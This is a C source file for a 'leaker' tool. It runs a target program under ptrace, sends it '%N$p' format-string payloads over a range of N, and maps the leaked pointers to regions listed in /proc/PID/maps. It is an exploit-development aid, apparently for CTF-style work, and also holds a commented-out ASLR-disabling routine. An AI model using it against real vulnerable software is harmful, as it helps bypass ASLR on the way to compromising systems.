#include <stdint.h>
#include <stdio.h>
#include <sys/poll.h>
#include <threads.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/user.h>

struct memSection {
	char beginAddr[17];
	char endAddr[17];
	char perms[5];
	char sectionName[256];
	struct memSection* next;
	char filled;
};

void closeIO(int fds[2][2]) {
	for (int i = 0; i < 3; ++i) {
		if (fds[i][0] != -1)
			close(fds[i][0]);
		if (fds[i][1] != -1)
			close(fds[i][1]);
	}
}

void freeMemSections(struct memSection* section) {
	if (section == NULL)
		return;
	if (section->next == NULL) {
		free(section);
	} else {
		freeMemSections(section->next);
	}
}

int fillSections(struct memSection** section, FILE* stream) {
	int retCode = 0;
	char line[1024];

	if (*section == NULL) {
		*section = malloc(sizeof(struct memSection));
		(*section)->next = NULL;
		(*section)->filled = 0;
	}
	struct memSection* cur = *section;
	while (fgets(line, 1023, stream)) {
		while(cur->filled) {
			if (cur->next == NULL) {
				cur->next = malloc(sizeof(struct memSection));
				cur = cur->next;
				cur->next = NULL;
				cur->filled = 0;
				break;
			} else {
				cur = cur->next;
			}
		}
		if (strchr(line, '-') == NULL)
			retCode |= 1;
		else {
			strncpy(cur->beginAddr, line, strchr(line, '-')-line);
			cur->beginAddr[strchr(line,'-')-line] = '\0';
		}
		if (strchr(line, ' ') == NULL)
			retCode |= 2;
		else {
			strncpy(cur->endAddr, strchr(line,'-')+1, strchr(line, ' ')-strchr(line,'-')-1);
			cur->endAddr[strchr(line,' ')-strchr(line,'-')-1] = '\0';
		}
		if (strchr(line,' ') == NULL)
			retCode |= 1;
		else
			strncpy(cur->perms, strchr(line, ' ')+1, 4);
		if (strrchr(line, ' ') == NULL)
			retCode |= 4;
		else {
			strncpy(cur->sectionName, strrchr(line, ' ')+1,256);
			char *nl = strchr(cur->sectionName, '\n');
			*nl = '\0';
		}
		cur->filled = 1;
	}

	return retCode;
}

int fillMemMap(char *line, struct memSection* mm) {
	int retCode = 0;
	if (strchr(line, '-') == NULL)
		retCode = 1;
	else {
		strncpy(mm->beginAddr, line, strchr(line, '-')-line);
		mm->beginAddr[strchr(line,'-')-line] = '\0';
	}
	if (strchr(line, ' ') == NULL)
		retCode = 2;
	else {
		strncpy(mm->endAddr, strchr(line, '-')+1, strchr(line, ' ')-strchr(line, '-')-1);

		mm->endAddr[strchr(line, ' ')-strchr(line, '-')-1] = '\0';
	}
	if (strchr(line, ' ') == NULL)
		retCode = 1;
	else
		strncpy(mm->perms, strchr(line, ' ')+1, 4);
	if (strrchr(line, ' ') == NULL)
		retCode = 4;
	else
		strncpy(mm->sectionName, strrchr(line, ' ')+1,256);

	return retCode;
}

#  define _GNU_SOURCE
#  include <sys/personality.h>

#  ifndef HAVE_PERSONALITY
#   include <syscall.h>
#   define personality(pers) ((long)syscall(SYS_personality, pers))
#  endif

#  ifndef ADDR_NO_RANDOMIZE
#   define ADDR_NO_RANDOMIZE 0x0040000
#  endif

static inline int disable_aslr(void) {
	unsigned long pers_value = PER_LINUX | ADDR_NO_RANDOMIZE;

	if (personality(pers_value) < 0) {
		/*
		* Depending on architecture and kernel version, personality
		* syscall is either capable or incapable of returning an error.
		* If the return value is not an error, then it's the previous
		* personality value, which can be an arbitrary value
		* undistinguishable from an error value.
		* To make things clear, a second call is needed.
		*/
		if (personality(pers_value) < 0)
			return 1;
	}
	return 0;
}


void printMemMap(struct memSection* mm) {
	struct memSection* cur = mm;
	while (cur != NULL) {
		printf("%s-%s %s %s\n", cur->beginAddr, cur->endAddr, cur->perms, cur->sectionName);
		cur = cur->next;
	}
}

int interestingFinder(struct memSection* section, unsigned long long address, int index) {
	int retCode = 0;
	struct memSection* cur = section;
	short isInteresting = 0;
	while (cur != NULL) {
		unsigned long long begin = strtoull(cur->beginAddr, NULL, 16);
		unsigned long long end = strtoull(cur->endAddr, NULL, 16);
		if (address >= begin && address <= end && strlen(cur->sectionName) != 0 && strcmp(cur->sectionName, "[vsyscall]") != 0) {
			if (!isInteresting) {
				isInteresting = 1;
				printf("[%d]: 0x%llx\n", index, address);
			}
			printf("\t%s\n", cur->sectionName);
		}
		cur = cur->next;
	}
	return retCode;
}

int parseMemMap(int pid, struct memSection** sections) {
	char filePath[64];
	char num[16];
	sprintf(num, "%d", pid);
	strcpy(filePath, "/proc/");
	strcat(filePath, num);
	strcat(filePath, "/maps");
	FILE* mapFile = NULL;
	if (mapFile = fopen(filePath, "r"), mapFile == NULL) {
		fprintf(stderr, "Error opening map file: %s\n", filePath);
		perror("fopen");
		return 1;
	}
	fillSections(sections, mapFile);

	fclose(mapFile);
	return 0;
}

int spawnProcess(char *path, char* payload, char* argv[], char* envp[], int index) {
	int io[3][2]; // 0: stdout, 1: stderr, 2: stdin
	for (int i = 0; i < 3; ++i) {
		io[i][0] = -1;
		io[i][1] = -1;
	}

	if(pipe(io[0])) {
		fprintf(stderr,"Pipe STDOUT creation failure.\n");
		return 2;
	}
	if (pipe(io[1])) {
		fprintf(stderr, "Pipe STDERR creation failure.\n");
		closeIO(io);
		return 2;
	}
	if (pipe(io[2])) {
		fprintf(stderr, "Pipe STDIN creation failure.\n");
		closeIO(io);
		return 2;
	}
	int child = fork();
	switch (child) {
		case -1: // Error
			fprintf(stderr, "Fork failure.\n");
			closeIO(io);
			return 3;
		case 0: // Child
			close(io[0][0]);
			close(io[1][0]);
			close(io[2][1]);

			dup2(io[0][1],STDOUT_FILENO);
			dup2(io[1][1],STDERR_FILENO);
			dup2(io[2][0],STDIN_FILENO);

			close(io[0][1]);
			close(io[1][1]);
			close(io[2][0]);
			//if (disable_aslr()) {
			//	fprintf(stderr, "Could not set personality\n");
			//	return 6;
			//}
			ptrace(PTRACE_TRACEME, 0, NULL, NULL);
			if (execve(path, argv, envp))
				perror("Execve");
			break;
		default: // Parent
			close(io[0][1]);
			close(io[1][1]);
			close(io[2][0]);
			int status;
			waitpid(child, &status, WUNTRACED);
			struct user_regs_struct regs;
			regs.rip = 0x7fffffffffff;
			fprintf(stderr, "Running... (%d)", index);
			while (regs.rip > 0x7f0000000000) {
				ptrace(PTRACE_GETREGS, child, 0, &regs);
				ptrace(PTRACE_SINGLESTEP, child, 0, 0);
			}
			fprintf(stderr, "\r\x1b[0K");
			struct memSection* sections = NULL;
			//ptrace(PTRACE_GETREGS, child, 0, &regs);
			//printf("RIP: %llu\n", regs.rip);
			parseMemMap(child, &sections);
			ptrace(PTRACE_CONT, child, 0, 0);
			// uleep(500);
			write(io[2][1], payload, strlen(payload));
			char buf[64];
			char delim;
			int nRead;
			//fprintf(stderr, "Reading...\n");
			while (nRead = read(io[0][0], &delim, 1), nRead > 0) {
				//fprintf(stderr,"%c", delim);
				nRead = 0;
				if (delim == '>') {
					//fprintf(stderr, "READ.\n");
					char addr[32];
					nRead = read(io[0][0], addr, 32);
					addr[nRead-1] = '\0';
					if (strstr(addr, "(nil)") != NULL)
						break;
					unsigned long long addr_dec = strtoull(addr, NULL, 16);
					//fprintf(stderr, "[*%d*] Got address: %s (%llx)\n", index, addr, addr_dec);
					interestingFinder(sections, addr_dec, index);
				}
			}
			if (nRead == -1)
				perror("Error reading");
			while (read(io[1][0], buf, 63)) {
				fprintf(stderr, "%s", buf);
			}
			waitpid(child, &status, WUNTRACED);
			freeMemSections(sections);
			close(io[0][0]);
			close(io[1][0]);
			close(io[2][1]);
	}
	return 0;
}

int main(int argc, char* argv[], char* envp[]) {
	if (argc < 4) {
		fprintf(stderr, "Usage: leaker [min] [max] ./program\n");
		return 1;
	}
	int min = atoi(argv[1]);
	int max = atoi(argv[2]);
	if (max < min) {
		fprintf(stderr, "Max {%d} cannot be less than min {%d}\n", max, min);
		return 4;
	}
	if (min < 1) {
		fprintf(stderr, "Min cannot be less than 1\n");
		return 5;
	}
	int ret;
	char payload[64];
	for (int i = min; i <= max; ++i) {
		strcpy(payload, "%");
		char num[20];
		sprintf(num, "%d", i);
		strcat(payload, num);
		strcat(payload, "$p\n");
		if (ret = spawnProcess(argv[3], payload, argv+3, envp, i),ret) {
			fprintf(stderr, "Spawn Process failed with ret code: %d\n", ret);
			return ret;
		}
		payload[0] = '\0';
	}
	return 0;
}
